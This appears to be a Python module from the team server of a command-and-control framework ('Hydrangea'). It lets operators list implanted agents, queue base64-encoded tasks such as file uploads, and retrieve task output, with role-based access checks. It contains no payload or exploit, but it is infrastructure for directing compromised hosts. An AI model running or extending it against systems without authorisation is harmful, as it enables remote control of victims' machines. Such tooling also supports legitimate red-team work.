from .socket_custom import SocketCustom
from database.database import HydrangeaDatabase
from .utils import base64Decode, base64Encode, generateRandomStr
import os

# Constants
AGENT_COMMANDS_PREFIX = (
    "agentsget",
    "tasknew",
    "tasksget"
)

# Handles Agent command; returns False if the input command is not a Task command
def handleAgentCommand(db: HydrangeaDatabase, socketClient: SocketCustom, clientId: str, user, userInput: str):
    # If command is for Task, handle here
    if userInput.startswith(AGENT_COMMANDS_PREFIX):
        # Split command
        userInputSplit = userInput.split(" ")

        # Get all agents
        if userInput.startswith("agentsget"): # agentsget
            if user.role not in ("operator", "admin"):
                socketClient.sendall(b"ERROR: Unauthorized")
            else:
                agents = db.getAllAgents()
                if agents:
                    agentsDataJson = "["
                    for agent in agents:
                        agentsDataJson += f"""
{{
    "agentId": "{agent.id}",
    "host": "{agent.host}",
    "username": "{agent.username}",
    "lastCheckinAt": {agent.lastCheckinAt}
}},"""
                    agentsDataJson = agentsDataJson.rstrip(",") + "\n]"
                    socketClient.sendall(agentsDataJson.encode("utf-8"))
                else:
                    socketClient.sendall(f"ERROR: Failed to get all agents".encode("utf-8"))
        
        # Create new task
        if userInput.startswith("tasknew"): # tasknew AGENT_ID TASK_DATA_B64
            if user.role not in ("operator", "admin"):
                socketClient.sendall(b"ERROR: Unauthorized")
            elif len(userInputSplit) != 3:
                socketClient.sendall(b"ERROR: Invalid input")
            else:
                task: str = base64Decode(userInputSplit[2])
                taskSplit = task.split("\x00")
                taskType = taskSplit[0]

                # Intervention - pre-process specific Task types

                ## For file upload, save the file on Team server, and store file path to it in Database
                if taskType == "UPLOAD":
                    # Get filename
                    filePathOnTarget = taskSplit[2]
                    filePathOnTargetSplitByBackslash = filePathOnTarget.split("\\")
                    filePathOnTargetSplitByFrontslash = filePathOnTarget.split("/")
                    filename = None
                    if len(filePathOnTargetSplitByBackslash) != 0:
                        filename = filePathOnTargetSplitByBackslash[-1]
                    elif len(filePathOnTargetSplitByFrontslash) != 0:
                        filename = filePathOnTargetSplitByFrontslash[-1]
                    else:
                        filename = generateRandomStr(7)

                    # Write file on server, then store pathname to it in database
                    pathToSaveHereOnServer = os.path.join(os.getcwd(), "uploads", filename)
                    with open(pathToSaveHereOnServer, "wb") as fileToSave:
                        fileToSave.write(base64Decode(taskSplit[1], outputString=False))
                    taskSplit[1] = pathToSaveHereOnServer
                    task = "\x00".join(taskSplit)

                # Log task
                print(userInputSplit[1], clientId, task)

                # Create new task
                if db.createNewTask(
                    agentId=userInputSplit[1],
                    originClientId=clientId,
                    task=task
                ):
                    socketClient.sendall(f"SUCCESS: Task created for agent '{userInputSplit[1]}'".encode("utf-8"))
                else:
                    socketClient.sendall(f"ERROR: Failed to create new task".encode("utf-8"))
        
        # Get agent's tasks
        if userInput.startswith("tasksget"): # tasksget [AGENT_ID]
            if user.role not in ("operator", "admin", "observer"):
                socketClient.sendall(b"ERROR: Unauthorized")
            else:
                tasks = None
                if len(userInputSplit) == 2:
                    tasks = db.getTasks(agentId=userInputSplit[1])
                else:
                    tasks = db.getTasks(agentId=None)
                tasksToSendJson = "["
                for task in tasks:
                    tasksToSendJson += f"""
{{
    "id": {task.id},
    "originClientId": "{task.originClientId}",
    "agentId": "{task.agentId}",
    "taskB64": "{base64Encode(task.task)}",
    "outputB64": "{base64Encode(task.output if task.output is not None else "null")}",
    "taskedAt": {task.taskedAt if task.taskedAt is not None else 0},
    "outputAt": {task.outputAt if task.outputAt is not None else 0}
}},"""
                tasksToSendJson = tasksToSendJson.rstrip(",") + "\n]"
                socketClient.sendall(tasksToSendJson.encode("utf-8"))

        # Return true because command has been handled        
        return True
    else:
        # Return false if command is not for Agent
        return False